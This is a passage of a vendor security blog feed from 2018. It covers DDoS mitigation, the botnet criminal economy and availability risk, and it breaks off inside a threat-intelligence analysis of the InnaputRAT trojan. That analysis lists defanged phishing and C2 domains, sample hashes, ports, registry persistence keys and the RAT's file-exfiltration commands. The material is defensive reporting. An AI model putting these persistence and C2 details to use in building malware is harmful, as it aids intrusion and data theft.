</ul><p><strong>Intelligently Automated Mitigation </strong></p>

<p>But being “automatic” and intelligently automated are two different things. <a href="https://www.netscout.com/ddos-protection">Today’s DDoS protection best practices</a> call for intelligently automated on-premise and cloud-based mitigation strategies. On-premise components (placed before stateful devices like firewalls and WAFs) are well suited for quickly mitigating the majority of attacks, especially the harder-to-detect application-layer attacks. Cloud-based DDoS protection is ideal for mitigating truly volumetric attacks upstream, before they saturate your connection to the internet.</p>

<p>A hybrid DDoS defense deployment combines on-premise with cloud-based mitigation offering the most comprehensive protection against today’s multi-vector DDoS attacks. Here’s an example of what is meant by intelligent automation. On-premise DDoS solutions are customized to protect specific applications running in a specific data center. This customization includes policies with specific white/black lists, geo-location information etc. These local, customized policies are continuously sent to a cloud-based DDoS protection service — before an attack occurs — in other words during peace time.</p>
<img alt="common misconceptions against DDoS attacks" data-entity-type="file" data-entity-uuid="a40ed29f-37c0-4890-8ec9-63352b43de15" src="http://localhost:7996/sites/default/files/inline-images/Intelligently%20automated%20image%202.JPG" class="align-center" /><p>When an attack larger than the capacity of the on-premise protection occurs, a digital signal is sent to the cloud-based DDoS protection. In which case, attack traffic is automatically rerouted to an appropriate cloud-based scrubbing center where previously sent customized protection policies, amongst others, are automatically applied to the attack traffic. This more intelligent method of attack traffic diversion and auto-mitigation using previously sent customized policies is an example of intelligent automation.</p>

<p>Automated, actionable threat intelligence and, where practical, leveraging automated processes are critical to the rapid detection and mitigation of today’s multi-vector, sophisticated DDoS attacks. Only by knowing more about the scope and inner workings of attacks can the enterprise achieve both rapid and efficient DDoS protection.</p>

<p><strong>Truly Actionable Threat Intelligence </strong></p>

<p>Truly actionable threat intelligence is characterized by:</p>

<ul><li>A source of continuous real-world network traffic and threat data beyond the enterprise. The larger the sample of current, real world data the better.</li>
	<li>The enhancement of this raw data with context: the ‘connecting-the-dots’ of what data points are related to attack campaigns and relevant to a specific threat.</li>
	<li>A high level of confidence. Intelligence that spawns false positives is not intelligence.</li>
</ul><p>By looking at cyber attack data from multiple sources and focusing on persistent malware characteristics, truly actionable intelligence identifies not only singular points of compromise, but data that is related as part of a campaign. Incorporating this broader context — the underlying command and control infrastructure, the historical, associated tactics, techniques and procedures (TTPs) — data becomes more reliable, actionable threat intelligence.</p>

<p>Such reliable intelligence is critical to power more automated, faster DDoS detection and effective mitigation. Automated identification based on current, actionable threat intelligence can be used regardless of attack volume. There’s no need to wait for an attack to reach a volume threshold before initiating mitigation. You can identify multiple types of DDoS attacks, including ‘low and slow’ application-layer attacks. Automatic detection of certain categories of botnets can stop them from compromising the network while enabling other security devices to do the jobs for which they are designed.</p>

<p>Many DDoS countermeasures can be automated — such as blocking specific types of attacks targeting bandwidth, applications and protocols. Automation can accommodate multiple levels of protection to align with risk profiles and confidence levels. Detection and identification of attacks can be communicated automatically with your security service provider or ISP, leading to faster, more effective upstream DDoS mitigation.</p>

<p>Marrying actionable intelligence with intelligently automated processes allows you to better manage the sheer volume of today’s attacks. Automation also allows you to deploy security resources more efficiently and focus them on threat triage: detecting, identifying and thwarting real threats faster. For example, automatically pre-populating SOC investigations with contextual, reliable threat intelligence (e.g., IP reputation data and currently active malware and TTPs) can speed up and enhance effective threat management for DDoS and beyond.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Intelligently%20automated%20main%20image.JPG" length="714728" type="image/jpeg"/>
    <guid isPermaLink="false">cdcf7768-01a5-4ec1-9cc8-6e57233366f8</guid>
    <pubDate>Mon, 16 Apr 2018 14:11:58 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>The Business of Botnets</title>
  <link>http://localhost:7996/blog/business-botnets</link>
  <description>The Mirai attacks against Dyn in 2016 drew widespread attention to botnets. Yet compared to how cybercriminals are using botnets today, the Dyn attacks may come to seem rather amateurish. Criminals are quickly learning how to leverage botnets running sophisticated malware as the infrastructure for massive, illegitimate moneymaking machines. Law enforcement has had a few...</description>
  <content:encoded><![CDATA[<p>The Mirai attacks against Dyn in 2016 drew widespread attention to botnets. Yet compared to how cybercriminals are using botnets today, the Dyn attacks may come to seem rather amateurish. Criminals are quickly learning how to leverage botnets running sophisticated malware as the infrastructure for massive, illegitimate moneymaking machines.</p>

<p>Law enforcement has had a few revealing successes against criminal botnet activity in recent years, but certainly not enough to make a significant dent in botnet fueled cybercrime.</p>

<h2>Examples of Recent Botnet Prosecutions Include:</h2>

<ul><li>U.S. Justice Department revealed the <a href="https://krebsonsecurity.com/2017/12/mirai-iot-botnet-co-authors-plead-guilty/" target="_blank">guilty pleas of two young men</a> for their roles in developing and using the <a href="https://www.netscout.com/blog/asert/mirai-not-just-iot-anymore">Mirai botnet</a>: 21-year-old Paras Jha and 20-year-old Josiah White. Jha and White targeted organizations with DDoS attacks and then extort money to call off the attacks, or sell them services to help fend off the attacks.</li>
	<li>Spanish authorities arrested <a href="https://www.wired.com/2017/04/fbi-took-russias-spam-king-massive-botnet/" target="_blank">Peter Yuryevich Levashov</a>, also known as Peter Severa, or “Peter of the North.” Levashov operated <a href="https://www.wired.com/2017/04/fbi-took-russias-spam-king-massive-botnet/" target="_blank">Kelihos</a>, one of the internet’s longest running botnets estimated to have infected as many as 100,000 computers. Levashov hired out Kelihos for $200–$500 per million messages.</li>
	<li>Two Israeli teenagers were arrested last year for running a DDoS for hire service called vDDoS. The pair made approximately $600,000 launching 150,000 DDoS attacks.</li>
</ul><h2>What is a Botnet?</h2>

<p>Botnets are overlays of software that run, typically unknown to the owners of those systems, on large collections of internet connected machines. Botnets themselves were originally designed as tools to automate the running of non-criminal, routine tasks. Ironically, one of the first documented botnets created in 1993, “<a href="https://en.wikipedia.org/wiki/Eggdrop" target="_blank">eggbot</a>,” was designed to manage and protect Internet Relay Chat (IRC) channels against takeover attempts. But criminals are rapidly learning to exploit the power of botnets as global, virtually automatic moneymaking engines.</p>

<p>Botnet malware has evolved to include different attack techniques that can be run simultaneously over multiple vectors. From the criminal’s perspective, the “botconomics” are very attractive. There is no infrastructure cost as they are leveraging compromised machines, unbeknownst to the machine’s owners. This free infrastructure means that revenue falls right to the bottom line, in the form of illicit profits. Beyond the ability to leverage this infrastructure there is the attractiveness of anonymity on the global internet. Even if demanding a ransom, the use of "untraceable" crypto-currency like Bitcoin makes it easy to see why botnets are emerging as a preferred platform for cybercriminals.</p>

<h2>The Botnet Business Model</h2>

<p>From a business model perspective, botnets are an excellent platform from which to launch a multitude of potential revenue-generating functions:</p>

<ul><li>Quickly spreading email containing ransomware</li>
	<li>As a platform for click fraud</li>
	<li>Open proxies for anonymous Internet access</li>
	<li>Brute-force cracking attempts on other Internet systems</li>
	<li>Hosting large scale phishing exploits</li>
	<li>Lifting CD keys or other software license data</li>
	<li>Theft of personal ID information, enabling ID theft</li>
	<li>Lifting credit card and other account information, including PIN numbers or “secret” passcodes</li>
	<li>Installing keyloggers to capture all user input to a system</li>
</ul><p>Another enabling factor is the ease with which one can now assemble, swap, and upgrade botnet malware components. The public release of LizardStresser source code in early 2015 helped kick-start this trend. Readily available and easy-to-use LizardStresser code offered some sophisticated <a href="https://www.netscout.com/what-is-ddos">DDoS attack</a> methods: hold open TCP connections, send a random string of junk characters to a TCP or UDP port, or repeatedly send TCP packets with specified flags. The malware also included a mechanism to run arbitrary shell commands; useful for downloading updated versions of LizardStresser with new command and control devices, or entirely different malware. Other botnet malware has since been released into the wild, most notably the Mirai malware in November 2016, thus dramatically lowering the “tech-savvy bar” for criminal activity while at the same time increasing the moneymaking options and flexibility.</p>

<h2>The Emergence of IoT Botnets</h2>

<p>But from a sheer size and traffic volume point of view, it is the explosion of unsecure IoT devices that is fueling unprecedented botnets. During the summer of 2016, an IoT botnet using the LizardStresser code leveraged an estimated 10,000 IoT devices (primarily webcams) to generate DDoS attacks with a sustained volume of 540 Gbps. The original Mirai botnet is estimated to have compromised 500,000 IoT devices worldwide.</p>

<p>Though some remediation efforts have been made by manufacturers, IoT devices are often shipped with default credentials or known security issues. In order to save time and money, manufacturers sometimes re-use hardware and software in different classes of devices. One result: the default passwords used to manage the original device may be shared across entirely different classes of devices. Billions of unsecured IoT devices are already deployed. And though projected growth has slowed (slightly), <a href="http://www.zdnet.com/article/iot-devices-will-outnumber-the-worlds-population-this-year-for-the-first-time/" target="_blank">the numbers are still staggering</a>.</p>
<img alt="IoT Connected Devices" data-entity-type="file" data-entity-uuid="52f1aed4-65c4-45da-a001-c2f0ad039d83" src="http://localhost:7996/sites/default/files/inline-images/BusinessBotnets%20fig1.JPG" class="align-center" /><p><a href="https://www.netscout.com/solutions/iot-monitoring">IoT devices</a> lend themselves perfectly for misuse as part of criminal botnets:</p>

<ul><li>They are usually unmanaged making them extremely useful as anonymous proxies.</li>
	<li>Typically, online 24x7, they are available for use in attacks at any time, usually without any bandwidth limitations or filtering.</li>
	<li>They frequently run a stripped-down version of the familiar Linux operating system. Botnet malware can be easily compiled for a large target architecture, mostly ARM/MIPS/x86.</li>
	<li>The stripped-down operating system means less room for security features, including auditing, and most compromises go unnoticed by the owners.</li>
</ul><p>A recent example of the power of criminal IoT botnet infrastructure: in November, the Necurs botnet began mailing out a new strain of Scarab ransomware. The massive campaign sent about 12.5 million infected emails in just six hours, a rate of 2 million emails an hour. This same botnet has been implicated in the spread of the Dridex banking trojan, Trickbot banking trojan, Locky ransomware, and Jaff ransomware.</p>

<p>The ready availability and ease of use of more sophisticated, flexible botnet malware, coupled with a substantial pool of unsecure IoT devices has made criminal botnets a major component of a growing Digital Underground economy. This economy has marketplaces for ill-gotten data, malicious services for hire, even its own currency. All indications are the criminal use of IoT botnets as moneymaking machines will only get worse.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/BusinessofBotnets%20main%20image.jpg" length="584448" type="image/jpeg"/>
    <guid isPermaLink="false">0becf632-f437-4610-a236-0a62adae65e1</guid>
    <pubDate>Wed, 11 Apr 2018 12:38:58 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Availability is Everything</title>
  <link>http://localhost:7996/blog/availability-everything</link>
  <description>With the increase in multi-vector attacks, security experts agree that reducing the risk from DDoS attacks requires a defense-in-depth or layered approach utilizing multiple, synchronized mitigation approaches.</description>
  <content:encoded><![CDATA[<p>What does availability mean for your business?</p>

<p>DDoS attacks bring significant risk to organizations that depend on their networks and websites as an integral part of their business. And these days, that’s just about everyone. Think about online banking, retailing, travel reservations, medical patient portals, telecommunications, B2B e-commerce — virtually every business model today includes a significant online transactional component or, in some cases, has shifted online entirely.</p>

<p>We’ve all experienced the feeling of frustration, or even desperation, when the online services we expect are not available to us instantly when we want or need them.</p>

<p>Imagine that happening to thousands or even millions of customers worldwide, simultaneously, and you can understand the potential impact of a single DDoS attack on your organization. Maintaining availability of digital platforms, networks, applications, and services is not simply a security issue — it is a business risk and continuity issue.</p>

<p>It doesn’t take much to take down a fairly substantial section of the internet. In November 2016, an accidental misconfiguration at a major internet infrastructure company led to outages at several large carriers. Although the “route leak” was accidental and not malicious, the resulting 90-minute lack of availability was still painful for the carriers and their customers alike.</p>

<p>A concerted attack can have far more damaging consequences. Unlike advanced threats or data breaches, which are designed for stealth in order to exfiltrate data of value, a successful DDoS attack is instantly recognizable. The symptoms range from poor performance and intermittent outages, to a stream of customer complaints, all the way to sudden and complete unavailability. Whatever the motive, disruption or denial of service is the goal.</p>

<p><strong>Have Threat Capabilities Leapfrogged Your Protection Capacity? </strong></p>

<p>DDoS attacks have been around just as long as e-commerce itself. Established organizations with a significant online presence have always taken measures to ensure availability. Ask yourself, however, if the protection you may have put in place several years ago is still adequate for a modern day attack. DDoS threat capabilities have become more complex, dynamic and multi-vector. Increasingly, attackers employ a combination of attack methodologies, on the assumption that at least one will succeed while the others divert defenses. These attack types include:</p>

<ul>
	<li><u>Volumetric:</u> Large bandwidth consuming attacks that essentially “flood” network pipes and router interfaces.</li>
	<li><u>TCP State Exhaustion:</u> Attacks that use up all available transmission control protocol (TCP) connections in internet infrastructure devices such as firewalls, load balancers, and web servers.</li>
	<li><u>Application Layer:</u> “Low and slow” attacks indented to gradually wear down resources in application servers.</li>
</ul>

<p>Moreover, attacks today are much easier for less sophisticated threat actors to launch, owing to the ready availability of inexpensive do-it-yourself attack tools and DDoS-for-hire services. The threat landscape has been further exacerbated by the rapid proliferation of inadequately secured Internet of Things (IoT) devices, which are being consumed into botnets and weaponized to launch multi-vector DDoS attacks.</p>

<p><strong>Evaluating Risks and Defenses </strong></p>

<p>With the increase in multi-vector attacks, security experts agree that reducing the risk from DDoS attacks requires a defense-in-depth or layered approach utilizing multiple, synchronized mitigation approaches.</p>

<p>Firewalls have long stood as the first line of defense, as policy enforcement solutions designed to prevent unauthorized data access. Unfortunately, firewalls are not very effective when it comes to availability threats like the modern day, multi-vector DDoS attack. Modern firewalls perform stateful packet inspection — maintaining records of all connections passing through the firewall. They determine whether a packet is the start of a new connection, part of an existing connection or invalid. But as stateful and inline devices, firewalls add to the attack surface and can be DDoS targets. They have no inherent capability to detect or stop DDoS attacks because attack vectors use open ports and protocols. As a result, firewalls are prone to become the first victims of DDoS as their capacity to track connections is exhausted. Because they are inline, they can also add network latency.</p>

<p>Finally, because they are stateful, they are susceptible to resource-exhausting attacks such as Transmission Control Protocol synchronous (TCP SYN) floods and spoofed Internet Control Message Protocol (ICMP) ping floods.</p>

<p>Intelligent DDoS Mitigation Solutions (IDMS) are purpose built for DDoS defense, they’re stateless, deployed on-premise, in front of the firewall. These solutions can handle the majority of attacks, in fact, 80% of DDoS attacks are less than 1 Gbps in attack size. However, they are not adequate for the growing number of large-scale attacks intended to overwhelm internet bandwidth. These larger attacks are best mitigated in the cloud. Best practice defense today is intelligently integrated combination of on-premise and cloud-based solutions.</p>

<p>Recognizing that denial of availability is a business risk, it makes sense to undergo a risk analysis to assess your vulnerabilities, understand the impact of a DDoS attack under various scenarios, and determine the measures you need to have in place for optimal risk mitigation.</p>

<p>Today’s DDoS threat is not the same as it was ten or even five years ago. If availability is paramount to your business, then defenses need to be updated to match the threat.</p>

<p><a href="https://www.netscout.com/ddos-protection">Click here</a>&nbsp;to learn more about NETSCOUT Arbor’s DDoS solutions.</p>
]]></content:encoded>
    <category domain="http://localhost:7996/tags/category/security">Security</category>
    <enclosure url="http://localhost:7996/sites/default/files/Availability%20main%20image.jpg" length="456892" type="image/jpeg"/>
    <guid isPermaLink="false">f738f421-4d42-4f0a-aed8-705e25812815</guid>
    <pubDate>Mon, 09 Apr 2018 12:32:47 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>The Tiger Effect, 2.0?</title>
  <link>http://localhost:7996/blog/atlas-tiger-effect</link>
  <description>The Masters kicks off today and by far the biggest story in Augusta Georgia this year is the unlikely comeback of Tiger Woods. He is, by far, the most important person in the sport. How excited are golf fans at the thought of his return? In the last tournament he played a few weeks ago, it had higher TV ratings than three of the four golf “majors” last year. Thinking about all...</description>
  <content:encoded><![CDATA[<p>The Masters kicks off today and by far the biggest story in Augusta Georgia this year is the unlikely comeback of Tiger Woods. He is, by far, the most important person in the sport. How excited are golf fans at the thought of his return? In the last tournament he played a few weeks ago, it had higher TV ratings than three of the four golf “majors” last year.</p>

<p>Thinking about all this, I was reminded of the influence Woods has on the game, and beyond. Way back in 2008, when he was at the top of his game, Woods make an electrifying comeback to win the U.S.Open. So many people were drawn to the event that many of our service provider customers thought they were under a DDoS attack.</p>

<p>Below is a chart we pulled from ATLAS at the time, which we dubbed <em>The Tiger Effect</em>.</p>
<img alt="ATLAS tiger effect chart" data-entity-type="file" data-entity-uuid="d930c5e8-c727-444d-b3d7-dba48f27f118" src="http://localhost:7996/sites/default/files/inline-images/The%20Tiger%20Effect%20chart.jpg" class="align-center" /><p> </p>

<p>From our blog post, The Tiger Effect, June 16, 2008,</p>

<p>“Starting around 9 am Pacific and peaking at 1:30 pm yesterday, many ISPs noticed an unusual increase in traffic. At first, a few security engineers worried they were under some type of new DDoS attack. But the flood of traffic did not appear directed at any individual customer — the gigabits of anomaly traffic surged to almost all customers from multi-national banks to the bakery down the street and home DSL / Cable users. For several ISPs, traffic into their network grew by 15-25%. In one provider, inbound traffic nearly doubled.</p>

<p>It turns out that the U.S. Open played at Torrey Pines yesterday generated one of the larger Internet-wide flash crowds this year. Traffic dipped and peaked corresponding to Tiger’s initial misses and subsequent spectacular comeback as millions of office bound fans tuned in to the live NBC and ESPN coverage.”</p>

<p>I know where I’ll be on Sunday afternoon, and I’m sure I’ll have lots of company. Will we see the Tiger Effect 2.0? I sure hope so.</p>

<p> </p>
]]></content:encoded>
    <enclosure url="http://localhost:7996/sites/default/files/TigerEffect.jpg" length="566941" type="image/jpeg"/>
    <guid isPermaLink="false">cd706b24-c74d-47fe-9295-16a69a0e8449</guid>
    <pubDate>Thu, 05 Apr 2018 12:30:14 -0400</pubDate>
    <source url="http://localhost:7996/full-blogs-2018.xml">NETSCOUT Blogs</source>
    <dc:creator>Kevin Whalen</dc:creator>
    </item>
<item>
  <title>Innaput Actors Utilize Remote Access Trojan Since 2016, Presumably Targeting Victim Files</title>
  <link>http://localhost:7996/blog/asert/innaput-actors-utilize-remote-access-trojan-2016-presumably</link>
  <description>Overview ASERT recently identified a campaign targeting commercial manufacturing in the US and potentially Europe in late 2017. The threat actors used phishing and downloader(s) to install a Remote Access Trojan (RAT) ASERT calls InnaputRAT on the target's machine. The RAT contained a series of commands that includes machine profiling and the ability to exfiltrate documents...</description>
  <content:encoded><![CDATA[<h2>Overview</h2>

<p>ASERT recently identified a campaign targeting commercial manufacturing&nbsp; in the US and potentially Europe in late 2017.&nbsp; &nbsp;The threat actors used phishing and downloader(s) to install a Remote Access Trojan (RAT) ASERT calls InnaputRAT on the target's machine.&nbsp; The RAT contained a series of commands that includes machine profiling and the ability to exfiltrate documents from the victims’ machines. We believe this activity ties to a specific set of actors with defined campaign goals. We’ve also observed similarities in binaries dating back to 2016, a clear indication that these threat actors have operated for nearly two years. &nbsp;</p>

<h2>Key Findings</h2>

<ul>
	<li>InnaputRAT, a RAT capable of exfiltrating files from victim machines, was distributed by threat actors using phishing and Godzilla Loader.</li>
	<li>The RAT has evolved through multiple variants dating back to 2016.</li>
	<li>Recent campaigns distributing InnaputRAT beaconed to live C2 as of March 26, 2018.</li>
</ul>

<p><a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/top_graph.png"><img alt="" class="wp-image-9620 size-medium" height="173" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/top_graph-300x173.png" width="300" /></a> Figure 1: InnaputRAT communicating to TOP domains.</p>

<h2>Attribution</h2>

<p>ASERT identified potential actors, or personas, tied to this campaign through domains registrations, Facebook, and Twitter accounts possibly tied to an email address used. We initially identified the campaign through several phishing attempts that led to additional infrastructure within the same campaign. This campaign shared a common malware payload, InnaputRAT. Some of the recent malware samples were attributed to the campaign through similarities in the binary rather than connected infrastructure. The phishing emails appear to lure victims with a geopolitical-theme.&nbsp; Sender email addresses and subject lines often reference the United Nations (UN).&nbsp; Further, while most of the domains associated with Aigul(Aygul) Akulova and Slabodan Miloshevich attempt to mimic Google or Microsoft products, a few of them were more specific in mimicking diplomacy related targets, notably un-booklet[.]com and us-embassy-report[.]com, suggesting a more specific audience. We identified the initial campaign through domains highlighted in the Phishing Domains section below. After analysis of the original infrastructure, we identified the InnaputRAT payload on additional infrastructure highlighted in the Additional Domains Section.</p>

<h2>Phishing Domains</h2>

<ol>
	<li>mfa-events[.]com</li>
	<li>officeonlaine[.]com</li>
	<li>blockhain[.]name</li>
	<li>iceerd[.]com</li>
</ol>

<p>All of these domains are tied to the email address s.miloshevich[@]yandex.ru with the registration name Slabodan Miloshevich. Each of the domains used Kazakhstan as the registrant's country.&nbsp; Additional domains registered by the same entity resolved to 4 distinct IP addresses (as of March 24. 2017). <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/slabodan_miloshevich.png"><img alt="" class="wp-image-9566 size-medium" height="241" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/slabodan_miloshevich-300x241.png" width="300" /></a> Figure 2: Domains registered by s.miloshevich[@]yandex.ru</p>

<h2>Additional Domain Analysis</h2>

<ol>
	<li>mfa-events[.]top</li>
	<li>officemicroupdate[.]com</li>
	<li>ico-investmen[.]com</li>
</ol>

<p>In the prior section we associated the first domain with s.miloshevich[@]yandex.ru.&nbsp; The actor behind innaput69[@]gmail.com registered domains two and three.&nbsp; All three domains hosted either a variant or the primary sample we analyzed, thus tying them together as part of the same activity. Looking at the domains registered by innaput69[@]gmail.com, the names on the account use the same last name but use two different first names.&nbsp; Notice all but one list the registrant contact country as RU. <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/innaput69.png"><img alt="" class="wp-image-9568 size-medium" height="98" src="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/innaput69-300x98.png" width="300" /></a> Figure 3: Domains tied to <a href="mailto:innaput69@gmail">innaput69@gmail</a>[.]com<br />
To find officemicroupdate[.]com we must dig through some historical domain registrar information.&nbsp; From March 1, 2017 – November 2, 2017 the registrant email was innaput69[@]gmail.com (according to Domain Tools) before the URL was taken over by Microsoft.&nbsp; Prior to March 1<sup>st</sup> of 2017 the registrant info was hidden behind a Privacy Protected Record so it is possible it was registered at one time by someone other than the actor behind innaput69[@]gmail.com.</p>

<h3>GodZilla Loader Link</h3>

<p>Pivoting off of the phone number for "Aygul A Akulova" in figure 3 we find another email address, jemesn[@]mail.ru. &nbsp;This email address is tied to a couple of other domains as well. <a href="https://www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/Aigul_Akulova-768x425.png"><img alt="" class="wp-image-9531 size-medium" height="166" src="//www.netscout.com/sites/default/files/asert-blog/uploads/2018/04/Aigul_Akulova-768x425-300x166.png" width="300" /></a> Figure 4: Registrant info for jemesn[@]mail.ru<br />
One of the domains associated with jemesn[@]mail.ru, update-app[.]top, hosted a copy of Godzilla Loader which we observed distributing InnaputRAT late March 2018. &nbsp;</p>

<h2>InnaputRAT Evolution</h2>

<p>All of the infrastructure and registrants were tied together with a common malware payload, InnaputRAT. We identified a recent version of the InnaputRAT through the initial phishing campaigns, infastructure correlation, and binary analysis. We then found several variations of the malware dating back to 2016.&nbsp; The binaries are listed below in chronological order. Our starting sample (5249a165de139c62cb9615c0e787a856) is listed as Sample 3 (below). We compared the binaries using Diaphora, an open source tool for comparing programs in a decompiler, and extracted relevant information showing the RAT’s evolution. &nbsp;</p>

<h2>Sample 1 - May, 29 2016</h2>

<table class="aligncenter">
	<tbody>
		<tr>
			<td width="154"><strong>MD5</strong></td>
			<td width="425">2939d7350f611263596bdc0917296aa3</td>
		</tr>
		<tr>
			<td width="154"><strong>Compile date</strong></td>
			<td width="425">2016-05-29 13:38:07</td>
		</tr>
		<tr>
			<td width="154"><strong>PDB</strong></td>
			<td width="425">N/A</td>
		</tr>
		<tr>
			<td width="154"><strong>ITW</strong></td>
			<td width="425">N/A</td>
		</tr>
		<tr>
			<td width="154"><strong>C2s:</strong></td>
			<td width="425">officemicroupdate[.]com</td>
		</tr>
		<tr>
			<td width="154"><strong>Communication </strong><strong>Port:</strong></td>
			<td width="425">5876</td>
		</tr>
		<tr>
			<td width="154"><strong>File Name:</strong></td>
			<td width="425">msupdate.exe</td>
		</tr>
		<tr>
			<td width="154"><strong>Persistence:</strong></td>
			<td width="425">Maldoc (27dac1fa017006933eaf2b044df0b443) drops a Dropper that creates a Windows Service (OfficeUpdateService) and executes the payload</td>
		</tr>
		<tr>
			<td width="154"><strong>Command Options</strong></td>
			<td width="425">Function Name: sub_401737
			<ol>
				<li>GetDriveAndVolInfo</li>
				<li>GetFileAttributeW</li>
				<li>EnumDirectory</li>
				<li>ReadFile (CreateFileMapping -&gt; MapViewOfFile)</li>
				<li>WriteFile</li>
				<li>DeleteFile</li>
				<li>ShellExecuteW</li>
				<li>GetSystemInfo</li>
			</ol>
			</td>
		</tr>
		<tr>
			<td width="154"><strong>Diaphora Function Match Stats</strong></td>
			<td width="425">Matches: 14 Unmatched: 30 &nbsp;- Includes sub_401737</td>
		</tr>
		<tr>
			<td width="154"><strong>Notes:</strong></td>
			<td width="425">
			<ul>
				<li>Dropped via: 27dac1fa017006933eaf2b044df0b443</li>
				<li>Linked to officemicroupdate[.]com via 185[.]61[.]151[.]110</li>
			</ul>
			</td>
		</tr>
	</tbody>
</table>

<p style="text-align: center"><small>Table 1: Sample 1 Analysis</small></p>

<p>&nbsp; We believe this to be an earlier variant of for the following reasons:</p>

<ul>
	<li>The “Command Options” used reflect later variants. The order of the options also reflects other variants.</li>
	<li>Although it doesn’t share as many matching functions as other samples, some of the binary structure matched newer variants.</li>
</ul>

<p>&nbsp; While we believe this sample is from the same family as Samples 2 through 5 (below), there are some notable differences that suggest the malware evolved over time:</p>

<ul>
	<li>Persistence method
	<ul>
		<li>This sample makes use of a service installed by a dropper file. In contrast, other samples use the Windows registry to install an Autorun key.</li>
		<li>Notably, the payload requires the dropper for execution and remains dormant if it is not present on the victim machine.</li>
	</ul>
	</li>
	<li>Windows API Calls
	<ul>
		<li>The <em>Read File</em> command for this sample used CreateFileMapping and MapViewOfFile while newer samples used CreateFileW and ReadFile.</li>
	</ul>
	</li>
</ul>

<p>The key functionality of the payload remains the same across all binaries: browse the victim file system with the intent to exfiltrate desired data. &nbsp;</p>

<h2>Sample 2 - June 5, 2017</h2>

<p>Sample 2 looks more like our starting point (Sample 3).</p>

<table class="aligncenter" width="624">
	<tbody>
		<tr>
			<td width="228"><strong>MD5</strong></td>
			<td width="396">8c3d37676f8f7711b381abf00155ef25</td>
		</tr>
		<tr>
			<td width="228"><strong>Compile date</strong></td>
			<td width="396">2017-06-05 16:57:38</td>
		</tr>
		<tr>
			<td width="228"><strong>PDB</strong></td>
			<td width="396">D:\Arena\RobotNet\FileTransferStream\Release\FileTransfer.pdb</td>
		</tr>
		<tr>
			<td width="228"><strong>ITW</strong></td>
			<td width="396">hxxp://best-online-tv[.]com/1.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>C2s:</strong></td>
			<td width="396">worlwidesupport[.]top ninjagames[.]top ajdhsfhiudsfhsi[.]top</td>
		</tr>
		<tr>
			<td width="228"><strong>Communication </strong><strong>Port:</strong></td>
			<td width="396">52100</td>
		</tr>
		<tr>
			<td width="228"><strong>File Name:</strong></td>
			<td width="396">SafeApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Persistence:</strong></td>
			<td width="396">HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Run: %appdata%\SafeApp\SafeApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Command Options:</strong></td>
			<td width="396">Function Name: sub_401B46
			<ol>
				<li>GetDriveVolInfo</li>
				<li>GetFileAttributesW</li>
				<li>EnumDirectory</li>
				<li>ReadFile (CreateFileW + ReadFile)</li>
				<li>WriteFile</li>
				<li>DeleteFile</li>
				<li>ShellExecuteW</li>
				<li>GetSystemInfo</li>
			</ol>
			</td>
		</tr>
		<tr>
			<td width="228"><strong>Diaphora Function Match Stats</strong></td>
			<td width="396">Matches: 36 &nbsp;&nbsp;- Includes sub_401B46 Unmatched: 4</td>
		</tr>
	</tbody>
</table>

<p style="text-align: center"><small>Table 2: Sample 2 Analysis</small></p>

<p>&nbsp; Performing a diffing operation using Diaphora, most of the functions in the binary matched, including “Command Options” and C2s used.&nbsp; This provides an increased level of confidence that Sample 2 is a variant of the “ground zero” binary in Sample 3 (below). The key difference between later variants and Sample 1, involve the persistence mechanism used and a change in the Read File “Command Option”. Later variants no longer rely on the dropper to set persistence via Windows Service, but instead create the Windows Registry key as seen in Table 2 and execute the malware. &nbsp;</p>

<h2>Sample 3 - August 22, 2017</h2>

<p style="text-align: left">Sample 3, our starting sample , is a near exact match with Sample 2, but seen hosted on a different server.</p>

<table class="aligncenter" width="624">
	<tbody>
		<tr>
			<td width="228">
			<p style="text-align: left"><strong>MD5</strong></p>
			</td>
			<td style="text-align: left" width="396">5249a165de139c62cb9615c0e787a856</td>
		</tr>
		<tr>
			<td width="228"><strong>Compile date</strong></td>
			<td width="396">2017-08-22 15:58:14</td>
		</tr>
		<tr>
			<td width="228"><strong>PDB</strong></td>
			<td width="396">N/A</td>
		</tr>
		<tr>
			<td width="228"><strong>ITW</strong></td>
			<td width="396">hxxp://mfa-events[.]com/upd.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>C2s:</strong></td>
			<td width="396">worlwidesupport[.]top ninjagames[.]top ajdhsfhiudsfhsi[.]top</td>
		</tr>
		<tr>
			<td width="228"><strong>Communication </strong><strong>Port</strong></td>
			<td width="396">52100</td>
		</tr>
		<tr>
			<td width="228"><strong>File Name</strong></td>
			<td width="396">NeutralApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Persistence</strong></td>
			<td width="396">HKU\&lt;SID&gt;\Software\Microsoft\Windows\CurrentVersion\Run: %appdata%\NeutralApp\NeutralApp.exe</td>
		</tr>
		<tr>
			<td width="228"><strong>Command Options</strong></td>
			<td width="396">Function Name: sub_401E39
			<ol>
				<li>GetDriveVolInfo</li>
				<li>GetFileAttributesW</li>
				<li>EnumDirectory</li>
				<li>ReadFile (CreateFileW + ReadFile)</li>
				<li>WriteFile</li>
				<li>DeleteFile</li>
				<li>ShellExecuteW</li>
				<li>GetSystemInfo</li>
			</ol>
			</td>
		</tr>
